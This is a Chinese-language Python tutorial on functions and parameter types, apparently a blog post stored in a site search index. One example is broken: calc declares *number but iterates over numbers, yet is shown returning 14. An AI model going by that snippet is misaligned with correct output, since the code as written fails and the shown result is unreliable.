<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>python函数</title>
    <url>/2021/03/27/python%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h5 id="一、调用函数"><a href="#一、调用函数" class="headerlink" title="一、调用函数"></a>一、调用函数</h5><h6 id="1-1内置函数"><a href="#1-1内置函数" class="headerlink" title="1.1内置函数"></a>1.1内置函数</h6><p>要调用一个函数，需要知道函数的名称和参数，比如求绝对值的函数<code>abs</code>，只有一个参数。可以直接从Python的官方网站查看文档：</p>
<p><a href="http://docs.python.org/3/library/functions.html#abs">http://docs.python.org/3/library/functions.html#abs</a></p>
<p>也可以在交互式命令行通过<code>help(abs)</code>查看<code>abs</code>函数的帮助信息。</p>
<p>调用<code>abs</code>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(<span class="number">100</span>)</span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(-<span class="number">20</span>)</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(<span class="number">12.34</span>)</span><br><span class="line"><span class="number">12.34</span></span><br></pre></td></tr></table></figure>

<p>调用函数的时候，如果传入的参数数量不对，会报<code>TypeError</code>的错误，并且Python会明确地告诉你：<code>abs()</code>有且仅有1个参数，但你给出了两个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="built_in">abs</span>() takes exactly one argument (<span class="number">2</span> given)</span><br></pre></td></tr></table></figure>

<p>如果传入的参数数量是对的，但参数类型不能被函数所接受，也会报<code>TypeError</code>的错误，并且给出错误信息：<code>str</code>是错误的参数类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: bad operand <span class="built_in">type</span> <span class="keyword">for</span> <span class="built_in">abs</span>(): <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<p>而<code>max</code>函数<code>max()</code>可以接收任意多个参数，并返回最大的那个：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">max</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, -<span class="number">5</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>



<h6 id="1-2-数据类型转换"><a href="#1-2-数据类型转换" class="headerlink" title="1.2 数据类型转换"></a>1.2 数据类型转换</h6><p>Python内置的常用函数还包括数据类型转换函数，比如<code>int()</code>函数可以把其他数据类型转换为整数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="number">12.34</span>)</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">float</span>(<span class="string">&#x27;12.34&#x27;</span>)</span><br><span class="line"><span class="number">12.34</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">1.23</span>)</span><br><span class="line"><span class="string">&#x27;1.23&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;100&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bool</span>(<span class="number">1</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bool</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>函数名其实就是指向一个函数对象的引用，完全可以把函数名赋给一个变量，相当于给这个函数起了一个“<font color=#FF0000>  别名 </font>”。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="built_in">abs</span> <span class="comment"># 变量a指向abs函数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a(-<span class="number">1</span>) <span class="comment"># 所以也可以通过a调用abs函数</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>



<h5 id="二、定义函数"><a href="#二、定义函数" class="headerlink" title="二、定义函数"></a>二、定义函数</h5><h6 id="2-1-自定义函数"><a href="#2-1-自定义函数" class="headerlink" title="2.1 自定义函数"></a>2.1 自定义函数</h6><p>自定义函数：使用<code>def</code>语句，依次写出函数名、括号、括号中的参数和冒号<code>:</code>，然后，在缩进块中编写函数体，函数的返回值用<code>return</code>语句返回。</p>
<p>函数体内部的语句在执行时，一旦执行到<code>return</code>时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。</p>
<p>如果没有<code>return</code>语句，函数执行完毕后也会返回结果，只是结果为<code>None</code>。<code>return None</code>可以简写为<code>return</code>。</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span> (<span class="string">&#x27;请输入姓名：&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tuji</span> (<span class="params">x</span>):</span></span><br><span class="line">	<span class="keyword">if</span> name == <span class="string">&quot;ll&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> x</span><br><span class="line">	<span class="keyword">elif</span> name == <span class="string">&#x27;ymm&#x27;</span>:</span><br><span class="line">		<span class="keyword">return</span> x</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> </span><br><span class="line"><span class="built_in">print</span> (name, <span class="string">&quot;is a&quot;</span>, tuji (<span class="string">&#x27;大佬&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D:\code\python&gt;python xh.py</span><br><span class="line">请输入姓名：ll</span><br><span class="line">ll <span class="keyword">is</span> a 大佬</span><br><span class="line"></span><br><span class="line">D:\code\python&gt;python xh.py</span><br><span class="line">请输入姓名：ymm</span><br><span class="line">ymm <span class="keyword">is</span> a 大佬</span><br><span class="line"></span><br><span class="line">D:\code\python&gt;python xh.py</span><br><span class="line">请输入姓名：lm</span><br><span class="line">lm <span class="keyword">is</span> a <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>如果把自己创建的函数定义保存为.py文件，可以在该文件的当前目录下启动python解释器，用<code>from 文件名（不含.py） import 自定义函数名</code>来导入自定义函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">D:\code\python&gt;python</span><br><span class="line">Python <span class="number">3.8</span><span class="number">.5</span> (tags/v3<span class="number">.8</span><span class="number">.5</span>:580fbb0, Jul <span class="number">20</span> <span class="number">2020</span>, <span class="number">15</span>:<span class="number">57</span>:<span class="number">54</span>) [MSC v<span class="number">.1924</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> xh <span class="keyword">import</span> tuji</span><br><span class="line">请输入姓名：ll</span><br><span class="line">ll <span class="keyword">is</span> a 大佬</span><br></pre></td></tr></table></figure>



<h6 id="2-2-空函数"><a href="#2-2-空函数" class="headerlink" title="2.2 空函数"></a>2.2 空函数</h6><p>定义一个什么事也不做的空函数，可以用<code>pass</code>语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nop</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><code>pass</code>可以用来作为占位符，比如现在还没想好怎么写函数的代码，就可以先放一个<code>pass</code>，让代码能运行起来。</p>
<p><code>pass</code>还可以用在其他语句里，比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>缺少了<code>pass</code>，代码运行就会有语法错误。</p>
<h6 id="2-3-参数检查"><a href="#2-3-参数检查" class="headerlink" title="2.3 参数检查"></a>2.3 参数检查</h6><p>调用函数时，如果参数个数不对，Python解释器会自动检查出来，并抛出<code>TypeError</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_abs(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: my_abs() takes <span class="number">1</span> positional argument but <span class="number">2</span> were given</span><br></pre></td></tr></table></figure>

<p>但是如果参数类型不对，Python解释器就无法帮我们检查。<code>my_abs</code>和内置函数<code>abs</code>的差别：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_abs(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">2</span>, <span class="keyword">in</span> my_abs</span><br><span class="line">TypeError: unorderable types: <span class="built_in">str</span>() &gt;= <span class="built_in">int</span>()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">abs</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: bad operand <span class="built_in">type</span> <span class="keyword">for</span> <span class="built_in">abs</span>(): <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<p>当传入了不恰当的参数时，内置函数<code>abs</code>会检查出参数错误，而我们定义的<code>my_abs</code>没有参数检查，会导致<code>if</code>语句出错，出错信息和<code>abs</code>不一样。所以，这个函数定义不够完善。</p>
<p>可以修改<code>my_abs</code>的定义，对参数类型做检查，只允许整数和浮点数类型的参数。数据类型检查可以用内置函数<code>isinstance()</code>实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_abs</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(x, (<span class="built_in">int</span>, <span class="built_in">float</span>)):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;bad operand type&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -x</span><br></pre></td></tr></table></figure>

<p>添加了参数检查后，如果传入错误的参数类型，函数就可以抛出一个错误：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_abs(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">3</span>, <span class="keyword">in</span> my_abs</span><br><span class="line">TypeError: bad operand <span class="built_in">type</span></span><br></pre></td></tr></table></figure>



<h6 id="2-4-返回多个值"><a href="#2-4-返回多个值" class="headerlink" title="2.4 返回多个值"></a>2.4 返回多个值</h6><p>比如在游戏中经常需要从一个点移动到另一个点，给出坐标、位移和角度，就可以计算出新的坐标：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">x, y, step, angle=<span class="number">0</span></span>):</span></span><br><span class="line">    nx = x + step * math.cos(angle)</span><br><span class="line">    ny = y - step * math.sin(angle)</span><br><span class="line">    <span class="keyword">return</span> nx, ny</span><br></pre></td></tr></table></figure>

<p><code>import math</code>语句表示导入<code>math</code>包，并允许后续代码引用<code>math</code>包里的<code>sin</code>、<code>cos</code>等函数。</p>
<p>然后，我们就可以同时获得返回值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x, y = move(<span class="number">100</span>, <span class="number">100</span>, <span class="number">60</span>, math.pi / <span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(x, y)</span><br><span class="line"><span class="number">151.96152422706632</span> <span class="number">70.0</span></span><br></pre></td></tr></table></figure>

<p>但其实这只是一种假象，Python函数返回的仍然是单一值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = move(<span class="number">100</span>, <span class="number">100</span>, <span class="number">60</span>, math.pi / <span class="number">6</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(r)</span><br><span class="line">(<span class="number">151.96152422706632</span>, <span class="number">70.0</span>)</span><br></pre></td></tr></table></figure>

<p>在语法上，返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple，按位置赋给对应的值，所以，Python的函数返回多值其实就是返回一个tuple。</p>
<h5 id="三、函数的参数"><a href="#三、函数的参数" class="headerlink" title="三、函数的参数"></a>三、函数的参数</h5><p>定义函数的时候，把参数的名字和位置确定下来，函数的接口定义就完成了。</p>
<p>Python的函数定义非常简单，但灵活度却非常大。除了正常定义的必选参数外，还可以使用默认参数、可变参数和关键字参数，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。</p>
<h6 id="3-1-位置参数"><a href="#3-1-位置参数" class="headerlink" title="3.1 位置参数"></a>3.1 位置参数</h6><p>对于<code>power(x)</code>函数，参数<code>x</code>就是一个位置参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x * x</span><br></pre></td></tr></table></figure>

<p>可以把<code>power(x)</code>修改为<code>power(x, n)</code>，用来计算x<sup>n</sup>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        s = s * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>

<p>对于这个修改后的<code>power(x, n)</code>函数，可以计算任意n次方：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">125</span></span><br></pre></td></tr></table></figure>

<p>修改后的<code>power(x, n)</code>函数有两个参数：<code>x</code>和<code>n</code>，这两个参数都是位置参数，调用函数时，传入的两个值按照位置顺序依次赋给参数<code>x</code>和<code>n</code>。</p>
<h6 id="3-2-默认参数"><a href="#3-2-默认参数" class="headerlink" title="3.2 默认参数"></a>3.2 默认参数</h6><p>默认参数可以简化函数的调用。例如把函数<code>power()</code>第二个参数n的默认值设定为2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">x, n=<span class="number">2</span></span>):</span></span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">        s = s * x</span><br><span class="line">    <span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>

<p>这样，当我们调用<code>power(5)</code>时，相当于调用<code>power(5, 2)</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>power(<span class="number">5</span>, <span class="number">2</span>)</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure>

<p>而对于<code>n &gt; 2</code>的其他情况，就必须明确地传入n，比如<code>power(5, 3)</code>。</p>
<blockquote>
<p>注意：</p>
<p>1.必选参数在前，默认参数在后，否则Python的解释器会报错。</p>
<p>2.当函数有多个参数时，把变化大的参数放前面，变化小的参数放后面。变化小的参数就可以作为默认参数。</p>
</blockquote>
<p>当不按顺序提供部分默认参数时，需要把参数名写上。</p>
<p><font color=#FF0000>  定义默认参数要牢记一点：默认参数必须指向不变对象！ </font>   </p>
<p>错误示范：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_end</span>(<span class="params">L=[]</span>):</span></span><br><span class="line">    L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure>

<p>正确代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_end</span>(<span class="params">L=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> L <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(<span class="string">&#x27;END&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure>



<h6 id="3-3-可变参数"><a href="#3-3-可变参数" class="headerlink" title="3.3 可变参数"></a>3.3 可变参数</h6><p>即传入的参数是可变的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span> (<span class="params">*number</span>):</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="built_in">sum</span> + n * n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br></pre></td></tr></table></figure>

<p>定义可变参数和定义一个list或tuple参数相比，仅仅在参数前面加了一个<code>*</code>号。在函数内部，参数<code>numbers</code>接收到的是一个tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括0个参数。</p>
<p>如果已经有一个list或者tuple，要调用一个可变参数，可以在list或tuple前面加一个<code>*</code>号，把list或tuple的所有元素作为可变参数传进去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>calc(*nums)</span><br><span class="line"><span class="number">14</span></span><br></pre></td></tr></table></figure>



<h6 id="3-4-关键字参数"><a href="#3-4-关键字参数" class="headerlink" title="3.4 关键字参数"></a>3.4 关键字参数</h6><p>可变参数允许你传入0个或任意个参数，这些可变参数在函数调用时自动组装为一个tuple。而关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, **kw</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;name:&#x27;</span>, name, <span class="string">&#x27;age:&#x27;</span>, age, <span class="string">&#x27;other:&#x27;</span>, kw)</span><br></pre></td></tr></table></figure>

<p>函数<code>person</code>除了必选参数<code>name</code>和<code>age</code>外，还接受关键字参数<code>kw</code>。在调用该函数时，可以只传入必选参数，也可以传入任意个数的关键字参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Michael&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">name: Michael age: <span class="number">30</span> other: &#123;&#125;</span><br><span class="line">            </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Bob&#x27;</span>, <span class="number">35</span>, city=<span class="string">&#x27;Beijing&#x27;</span>)</span><br><span class="line">name: Bob age: <span class="number">35</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>&#125;</span><br><span class="line">            </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Adam&#x27;</span>, <span class="number">45</span>, gender=<span class="string">&#x27;M&#x27;</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">name: Adam age: <span class="number">45</span> other: &#123;<span class="string">&#x27;gender&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>可以先组装出一个dict，然后，把该dict转换为关键字参数传进去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>extra = &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, **extra)</span><br><span class="line">name: Jack age: <span class="number">24</span> other: &#123;<span class="string">&#x27;city&#x27;</span>: <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;job&#x27;</span>: <span class="string">&#x27;Engineer&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>**extra</code>表示把<code>extra</code>这个dict的所有key-value用关键字参数传入到函数的<code>**kw</code>参数，<code>kw</code>将获得一个dict，注意<code>kw</code>获得的dict是<code>extra</code>的一份拷贝，对<code>kw</code>的改动不会影响到函数外的<code>extra</code>。</p>
<h6 id="3-5-命名关键字参数"><a href="#3-5-命名关键字参数" class="headerlink" title="3.5 命名关键字参数"></a>3.5 命名关键字参数</h6><p>在函数内部通过<code>kw</code>检查传入了哪些参数，例如检查<code>person()</code>函数中是否有<code>city</code>和<code>job</code>参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, **kw</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;city&#x27;</span> <span class="keyword">in</span> kw:</span><br><span class="line">        <span class="comment"># 有city参数</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;job&#x27;</span> <span class="keyword">in</span> kw:</span><br><span class="line">        <span class="comment"># 有job参数</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;name:&#x27;</span>, name, <span class="string">&#x27;age:&#x27;</span>, age, <span class="string">&#x27;other:&#x27;</span>, kw)</span><br></pre></td></tr></table></figure>

<p>但是调用者仍可以传入不受限制的关键字参数。如果要限制关键字参数的名字，就可以用命名关键字参数，例如，只接收<code>city</code>和<code>job</code>作为关键字参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *, city, job</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(name, age, city, job)</span><br></pre></td></tr></table></figure>

<p>和关键字参数<code>**kw</code>不同，命名关键字参数需要一个特殊分隔符<code>*</code>，<code>*</code>后面的参数被视为命名关键字参数。</p>
<p>调用方式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; person(&#39;Jack&#39;, 24, city&#x3D;&#39;Beijing&#39;, job&#x3D;&#39;Engineer&#39;)</span><br><span class="line">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure>

<p>如果函数定义中已经有了一个可变参数，后面跟着的命名关键字参数就不再需要一个特殊分隔符<code>*</code>了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *args, city, job</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(name, age, args, city, job)</span><br></pre></td></tr></table></figure>

<p>命名关键字参数必须传入参数名，这和位置参数不同。如果没有传入参数名，调用将报错：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: person() takes <span class="number">2</span> positional arguments but <span class="number">4</span> were given</span><br></pre></td></tr></table></figure>

<p>由于调用时缺少参数名<code>city</code>和<code>job</code>，Python解释器把这4个参数均视为位置参数，但<code>person()</code>函数仅接受2个位置参数。</p>
<p>命名关键字参数可以有缺省值，从而简化调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, *, city=<span class="string">&#x27;Beijing&#x27;</span>, job</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(name, age, city, job)</span><br></pre></td></tr></table></figure>

<p>由于命名关键字参数<code>city</code>具有默认值，调用时，可不传入<code>city</code>参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>person(<span class="string">&#x27;Jack&#x27;</span>, <span class="number">24</span>, job=<span class="string">&#x27;Engineer&#x27;</span>)</span><br><span class="line">Jack <span class="number">24</span> Beijing Engineer</span><br></pre></td></tr></table></figure>

<p>使用命名关键字参数时，要特别注意，如果没有可变参数，就必须加一个<code>*</code>作为特殊分隔符。如果缺少<code>*</code>，Python解释器将无法识别位置参数和命名关键字参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span>(<span class="params">name, age, city, job</span>):</span></span><br><span class="line">    <span class="comment"># 缺少 *，city和job被视为位置参数</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h6 id="3-6-参数组合"><a href="#3-6-参数组合" class="headerlink" title="3.6 参数组合"></a>3.6 参数组合</h6><p>在Python中，必选参数、默认参数、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。但是参数定义的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p>
<p>比如定义一个函数，包含上述若干种参数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">a, b, c=<span class="number">0</span>, *args, **kw</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;args =&#x27;</span>, args, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">a, b, c=<span class="number">0</span>, *, d, **kw</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;a =&#x27;</span>, a, <span class="string">&#x27;b =&#x27;</span>, b, <span class="string">&#x27;c =&#x27;</span>, c, <span class="string">&#x27;d =&#x27;</span>, d, <span class="string">&#x27;kw =&#x27;</span>, kw)</span><br></pre></td></tr></table></figure>

<p>在函数调用的时候，Python解释器自动按照参数位置和参数名把对应的参数传进去。</p>
